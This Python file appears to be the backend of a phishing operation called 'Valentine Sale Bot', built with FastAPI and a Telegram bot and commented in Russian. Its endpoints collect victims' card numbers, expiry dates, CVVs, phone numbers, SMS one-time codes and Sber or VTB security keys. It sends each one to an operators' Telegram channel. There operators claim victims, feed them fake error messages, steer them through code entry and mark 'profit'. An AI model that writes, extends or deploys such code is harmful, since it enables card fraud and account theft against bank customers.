#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Valentine Sale Bot - Полная версия с FastAPI + aiogram
"""

import asyncio
import logging
import datetime
import json
import os
from contextlib import asynccontextmanager

from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

import uvicorn

from config import (
    BOT_TOKEN, ADMIN_CHANNEL, PROXY_URL, API_HOST, API_PORT,
    FIRST_ERRORS, CODE_ERRORS
)
from database import init_db, Log, Code, Password, Ad
from utils import (
    get_bank_by_bin, get_device_info, mask_card,
    format_log_message, format_taken_log_message, format_repeat_log_message, format_code_message,
    get_new_log_keyboard, get_repeat_log_keyboard, get_code_keyboard, 
    get_password_keyboard, get_taken_keyboard, get_error_keyboard
)

# ============================================
# ЛОГИРОВАНИЕ
# ============================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================
# AIOGRAM БОТ (инициализация отложена до async контекста)
# ============================================
bot: Bot = None
dp = Dispatcher()
router = Router()

def init_bot():
    """Инициализация бота (вызывается в async контексте)"""
    global bot
    session = AiohttpSession(proxy=PROXY_URL)
    bot = Bot(token=BOT_TOKEN, session=session, default=DefaultBotProperties(parse_mode="HTML"))

# ============================================
# FASTAPI
# ============================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    init_bot()
    await init_db()
    logger.info("✅ База данных инициализирована")
    
    # Запускаем бота в фоне
    asyncio.create_task(start_bot())
    logger.info("✅ Telegram бот запущен")
    
    try:
        await bot.send_message(ADMIN_CHANNEL, "🤖 Бот запущен!")
    except Exception as e:
        logger.error(f"Не удалось отправить сообщение о старте: {e}")
    
    yield
    
    # Shutdown
    await bot.session.close()

app = FastAPI(docs_url=None, lifespan=lifespan)

# Статические файлы и шаблоны (будут позже)
# app.mount("/static", StaticFiles(directory="../static"), name="static")
# templates = Jinja2Templates(directory="../templates")

# ============================================
# НАСТРОЙКИ (JSON файл)
# ============================================
SETTINGS_FILE = os.path.join(os.path.dirname(__file__), "data", "settings.json")

def load_settings() -> dict:
    """Загрузка настроек из JSON файла"""
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            pass
    return {"gift_link": ""}

def save_settings(settings: dict):
    """Сохранение настроек в JSON файл"""
    os.makedirs(os.path.dirname(SETTINGS_FILE), exist_ok=True)
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(settings, f, ensure_ascii=False, indent=2)

def get_gift_link() -> str:
    """Получить текущую ссылку подарка"""
    return load_settings().get("gift_link", "")

def set_gift_link(link: str):
    """Установить ссылку подарка"""
    settings = load_settings()
    settings["gift_link"] = link
    save_settings(settings)

# ============================================
# TELEGRAM ОБРАБОТЧИКИ
# ============================================

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "🤖 <b>Valentine Sale Bot</b>\n\n"
        "Команды:\n"
        "/setlink <ссылка> — установить ссылку подарка\n"
        "/getlink — посмотреть текущую ссылку"
    )

@router.message(Command("setlink"))
async def cmd_setlink(message: types.Message):
    """Установить ссылку подарка"""
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip():
        await message.answer("❌ Укажите ссылку: /setlink https://example.com")
        return
    
    link = args[1].strip()
    set_gift_link(link)
    await message.answer(f"✅ Ссылка подарка установлена:\n<code>{link}</code>")
    logger.info(f"Gift link updated to: {link}")

@router.message(Command("getlink"))
async def cmd_getlink(message: types.Message):
    """Посмотреть текущую ссылку подарка"""
    link = get_gift_link()
    if link:
        await message.answer(f"🎁 Текущая ссылка подарка:\n<code>{link}</code>")
    else:
        await message.answer("⚠️ Ссылка подарка не установлена.\nУстановите: /setlink https://example.com")

@router.callback_query(F.data == "_")
async def empty_callback(callback: types.CallbackQuery):
    await callback.answer()

# --- ВЗЯТЬ ЛОГ ---
@router.callback_query(F.data.startswith("take_log:"))
async def take_log(callback: types.CallbackQuery):
    log_id = int(callback.data.split(":")[1])
    log = await Log.get_by_id(log_id)
    
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    if log.status != "waiting":
        await callback.answer("❌ Лог уже взят!", show_alert=True)
        return
    
    # Берём лог
    handler_name = callback.from_user.username or callback.from_user.first_name
    await log.take(callback.from_user.id, handler_name)
    
    # Обновляем сообщение
    await callback.message.edit_text(
        format_taken_log_message(log),
        reply_markup=get_taken_keyboard(log.id)
    )
    
    await callback.answer("✅ Лог взят!")
    logger.info(f"Лог #{log.id} взят пользователем @{handler_name}")

# --- ОШИБКИ ПЕРВИЧНЫЕ ---
@router.callback_query(F.data.startswith("first_error:"))
async def first_error(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    error_idx = int(parts[1])
    log_id = int(parts[2])
    
    log = await Log.get_by_id(log_id)
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    errors = list(FIRST_ERRORS.keys())
    error_key = errors[error_idx]
    error_text = FIRST_ERRORS[error_key]
    
    await log.update_status("error", error_text)
    
    await callback.message.edit_reply_markup(reply_markup=get_error_keyboard(error_key))
    await callback.answer(f"Отправлена ошибка: {error_key}")
    logger.info(f"Лог #{log.id} - ошибка: {error_key}")

# --- РЕДИРЕКТ НА КОД ---
@router.callback_query(F.data.startswith("redirect_to_code:"))
async def redirect_to_code(callback: types.CallbackQuery):
    log_id = int(callback.data.split(":")[1])
    log = await Log.get_by_id(log_id)
    
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    await log.update_status("taken")
    
    await callback.message.edit_reply_markup(
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text="🤝 ОТПРАВЛЕН НА КОД", callback_data="_")]
        ])
    )
    
    await callback.answer("✅ Клиент отправлен на код")

# --- ОШИБКИ КОДА ---
@router.callback_query(F.data.startswith("code_error:"))
async def code_error(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    error_idx = int(parts[1])
    code_id = int(parts[2])
    
    code = await Code.get_by_id(code_id)
    if not code:
        await callback.answer("❌ Код не найден", show_alert=True)
        return
    
    log = await code.get_log()
    
    errors = list(CODE_ERRORS.keys())
    error_key = errors[error_idx]
    error_text = CODE_ERRORS[error_key]
    
    await code.update_status(error_text)
    
    if "Неверный код" in error_key:
        log.block_code_input = True
        await log.save()
    
    await callback.message.edit_reply_markup(reply_markup=get_error_keyboard(error_key))
    await callback.answer(f"Отправлена ошибка")
    logger.info(f"Код #{code.id} - ошибка: {error_key}")

# --- КЛЮЧ БЕЗОПАСНОСТИ ---
@router.callback_query(F.data.startswith("security_key:"))
async def security_key(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    bank_type = parts[1]  # sber или vtb
    code_id = int(parts[2])
    
    code = await Code.get_by_id(code_id)
    if not code:
        await callback.answer("❌ Код не найден", show_alert=True)
        return
    
    key_type = "SECURITY_KEY" if bank_type == "sber" else "SECURITY_KEY_VTB"
    await code.update_status(key_type)
    
    bank_name = "Сбер 🟩" if bank_type == "sber" else "ВТБ 🟦"
    
    await callback.message.edit_reply_markup(
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text=f"🔑 Редирект на ключ ({bank_name})", callback_data="_")]
        ])
    )
    
    await callback.answer(f"✅ Редирект на ключ {bank_name}")

# --- УСПЕХ ---
@router.callback_query(F.data.startswith("success:"))
async def success_log(callback: types.CallbackQuery):
    log_id = int(callback.data.split(":")[1])
    log = await Log.get_by_id(log_id)
    
    if not log:
        await callback.answer("❌ Лог не найден", show_alert=True)
        return
    
    await log.update_status("success")
    
    await callback.message.edit_text(
        callback.message.text + "\n\n✅ <b>УСПЕШНО ЗАВЕРШЕНО</b>",
        reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
            [types.InlineKeyboardButton(text="✅ ПРОФИТ ✅", callback_data="_")]
        ])
    )
    
    await callback.answer("✅ Успех!")
    logger.info(f"Лог #{log.id} - УСПЕХ!")

# --- ОБРАБОТКА ПАРОЛЯ ---
@router.callback_query(F.data.startswith("password:"))
async def password_action(callback: types.CallbackQuery):
    parts = callback.data.split(":")
    action = parts[1]
    password_id = int(parts[2])
    
    password = await Password.get_by_id(password_id)
    if not password:
        await callback.answer("❌ Не найдено", show_alert=True)
        return
    
    code = await Code.get_by_id(password.code_id)
    
    if action == "BAD":
        await password.update_status("BAD_PASSWORD")
        await callback.message.edit_reply_markup(
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="❌ Неверный ключ", callback_data="_")]
            ])
        )
    elif action == "CODE":
        await password.update_status("RETURN_TO_CODE")
        await code.update_status("RETURN_TO_CODE")
        await callback.message.edit_reply_markup(
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="📟 Возврат на код", callback_data="_")]
            ])
        )
    elif action == "BACK":
        await password.update_status("RETURN_TO_CARD")
        await callback.message.edit_reply_markup(
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="⬅️ Возврат на карту", callback_data="_")]
            ])
        )
    elif action == "OK":
        await password.update_status("SUCCESS")
        await callback.message.edit_reply_markup(
            reply_markup=types.InlineKeyboardMarkup(inline_keyboard=[
                [types.InlineKeyboardButton(text="✅ Подтверждено", callback_data="_")]
            ])
        )
    
    await callback.answer()

# Регистрация роутера
dp.include_router(router)

async def start_bot():
    """Запуск Telegram бота"""
    await dp.start_polling(bot)

# ============================================
# API ENDPOINTS
# ============================================

@app.get("/api/health")
async def health():
    return {"status": "ok", "time": datetime.datetime.now().isoformat()}

@app.get("/api/gift-link")
async def api_gift_link():
    """Получение текущей ссылки подарка"""
    link = get_gift_link()
    return {"link": link}

@app.post("/api/createLog")
async def create_log(request: Request):
    """Создание нового лога карты"""
    body = await request.json()
    user_agent = request.headers.get("User-Agent", "")
    
    card = body.get("number", "").replace(" ", "")
    phone = body.get("phone_num", "")
    expire = body.get("expire", "-")
    cvv = body.get("cvv", "-")
    balance = body.get("balance", "")
    ad_id = body.get("adId")
    
    # Определяем банк
    bank = await get_bank_by_bin(card)
    device = get_device_info(user_agent)
    
    # Проверяем существующий лог по карте
    old_log = await Log.get_by_card(card)
    
    if old_log and old_log.handler_id:
        # Повторный переход
        log = Log(
            card_number=card,
            card_expiry=expire,
            cvv=cvv,
            phone=phone,
            balance=balance,
            bank=bank,
            device=device,
            ad_id=ad_id,
            handler_id=old_log.handler_id,
            handler_name=old_log.handler_name,
            status="taken",
            topic="🔄 | ПОВТОРНЫЙ ПЕРЕХОД"
        )
        await log.save()
        
        # Отправляем в Telegram
        try:
            msg = await bot.send_message(
                ADMIN_CHANNEL,
                format_repeat_log_message(log),
                reply_markup=get_repeat_log_keyboard(log.id),
                reply_to_message_id=old_log.message_id
            )
            log.message_id = msg.message_id
            await log.save()
        except Exception as e:
            logger.error(f"Ошибка отправки в Telegram: {e}")
        
        return {"token": log.id}
    
    else:
        # Новый лог
        log = Log(
            card_number=card,
            card_expiry=expire,
            cvv=cvv,
            phone=phone,
            balance=balance,
            bank=bank,
            device=device,
            ad_id=ad_id,
            status="waiting",
            topic="🟧 | Лог карты"
        )
        await log.save()
        
        # Отправляем в Telegram
        try:
            msg = await bot.send_message(
                ADMIN_CHANNEL,
                format_log_message(log),
                reply_markup=get_new_log_keyboard(log.id)
            )
            log.message_id = msg.message_id
            await log.save()
        except Exception as e:
            logger.error(f"Ошибка отправки в Telegram: {e}")
        
        return {"token": log.id}

@app.post("/api/log/status")
async def check_log_status(request: Request):
    """Проверка статуса лога"""
    body = await request.json()
    log_id = body.get("logId")
    
    log = await Log.get_by_id(log_id)
    if not log:
        return {"status": None}
    
    return {
        "status": log.status if log.status != "waiting" else None,
        "error": log.error_text,
        "question_text": log.question_text
    }

@app.post("/api/send/code")
async def send_code(request: Request):
    """Отправка СМС кода"""
    body = await request.json()
    log_id = body.get("logId")
    code_value = body.get("code")
    
    log = await Log.get_by_id(log_id)
    if not log:
        return {"error": "Log not found"}
    
    # Создаём код
    code = Code(log_id=log.id, code=code_value)
    await code.save()
    
    # Отправляем в Telegram
    try:
        msg = await bot.send_message(
            ADMIN_CHANNEL,
            format_code_message(log, code_value),
            reply_markup=get_code_keyboard(code.id, log.id),
            reply_to_message_id=log.message_id
        )
        await code.update_message_id(msg.message_id)
    except Exception as e:
        logger.error(f"Ошибка отправки кода: {e}")
    
    return {"code_id": code.id}

@app.post("/api/check/code")
async def check_code_status(request: Request):
    """Проверка статуса кода"""
    body = await request.json()
    code_id = body.get("codeId")
    
    code = await Code.get_by_id(code_id)
    if not code:
        return {"statusLog": None}
    
    return {"statusLog": code.status}

@app.post("/api/security/password")
async def send_password(request: Request):
    """Отправка ключа безопасности"""
    body = await request.json()
    code_id = body.get("code_id")
    password_value = body.get("password")
    
    code = await Code.get_by_id(code_id)
    if not code:
        return {"error": "Code not found"}
    
    log = await code.get_log()
    
    # Создаём пароль
    password = Password(code_id=code.id, password=password_value)
    await password.save()
    
    # Определяем тип ключа
    key_type = "(Сбер 🟩)" if code.status == "SECURITY_KEY" else "(ВТБ 🟦)"
    
    # Отправляем в Telegram
    try:
        msg = await bot.send_message(
            ADMIN_CHANNEL,
            f"<b>🔑 | Ключ безопасности {key_type}</b>\n\n<b>Ключ:</b> <code>{password_value}</code>",
            reply_markup=get_password_keyboard(password.id),
            reply_to_message_id=code.message_id
        )
        password.message_id = msg.message_id
        await password.save()
    except Exception as e:
        logger.error(f"Ошибка отправки пароля: {e}")
    
    return {"password_id": password.id}

@app.post("/api/security/check")
async def check_password_status(request: Request):
    """Проверка статуса пароля"""
    body = await request.json()
    password_id = body.get("password_id")
    
    password = await Password.get_by_id(password_id)
    if not password:
        return {"status": None}
    
    return {"status": password.status}

@app.post("/api/updateOnline")
async def update_online(request: Request):
    """Обновление онлайн статуса"""
    body = await request.json()
    ad_id = body.get("id")
    
    if ad_id:
        ad = await Ad.get_by_id(ad_id)
        if ad:
            await ad.update_online()
    
    return {"ok": True}

# ============================================
# ПРОСТЫЕ СТРАНИЦЫ (API для фронтенда)
# ============================================

@app.get("/api/log/{log_id}/status")
async def get_log_status(log_id: int):
    """GET версия проверки статуса"""
    log = await Log.get_by_id(log_id)
    if not log:
        return JSONResponse({"error": "Not found"}, status_code=404)
    
    return {
        "status": log.status,
        "error": log.error_text,
        "card_last4": log.card_number[-4:] if log.card_number else None
    }

@app.post("/api/log/{log_id}/code")
async def post_code(log_id: int, request: Request):
    """Отправка кода (простой API)"""
    body = await request.json()
    code_value = body.get("code")
    
    log = await Log.get_by_id(log_id)
    if not log:
        return JSONResponse({"error": "Not found"}, status_code=404)
    
    # Создаём код
    code = Code(log_id=log.id, code=code_value)
    await code.save()
    
    log.status = "code_received"
    await log.save()
    
    # Отправляем в Telegram
    try:
        msg = await bot.send_message(
            ADMIN_CHANNEL,
            format_code_message(log, code_value),
            reply_markup=get_code_keyboard(code.id, log.id),
            reply_to_message_id=log.message_id
        )
        await code.update_message_id(msg.message_id)
    except Exception as e:
        logger.error(f"Ошибка отправки кода: {e}")
    
    return {"success": True, "code_id": code.id}

@app.post("/api/log")
async def create_simple_log(request: Request):
    """Простое создание лога (для receive.html)"""
    body = await request.json()
    user_agent = request.headers.get("User-Agent", "")
    
    card = body.get("card", "").replace(" ", "")
    phone = body.get("phone", "")
    
    bank = await get_bank_by_bin(card)
    device = get_device_info(user_agent)
    
    # Проверяем существующий лог
    old_log = await Log.get_by_card(card)
    
    if old_log and old_log.handler_id:
        # Повторный переход
        log = Log(
            card_number=card,
            phone=phone,
            bank=bank,
            device=device,
            handler_id=old_log.handler_id,
            handler_name=old_log.handler_name,
            status="taken",
            topic="🔄 | ПОВТОРНЫЙ ПЕРЕХОД"
        )
        await log.save()
        
        try:
            msg = await bot.send_message(
                ADMIN_CHANNEL,
                format_repeat_log_message(log),
                reply_markup=get_repeat_log_keyboard(log.id),
                reply_to_message_id=old_log.message_id
            )
            log.message_id = msg.message_id
            await log.save()
        except Exception as e:
            logger.error(f"Ошибка: {e}")
        
        return {"success": True, "log_id": log.id}
    
    else:
        log = Log(
            card_number=card,
            phone=phone,
            bank=bank,
            device=device,
            status="waiting"
        )
        await log.save()
        
        try:
            msg = await bot.send_message(
                ADMIN_CHANNEL,
                format_log_message(log),
                reply_markup=get_new_log_keyboard(log.id)
            )
            log.message_id = msg.message_id
            await log.save()
        except Exception as e:
            logger.error(f"Ошибка: {e}")
        
        return {"success": True, "log_id": log.id}

# ============================================
# ЗАПУСК
# ============================================

if __name__ == "__main__":
    uvicorn.run(app, host=API_HOST, port=API_PORT)
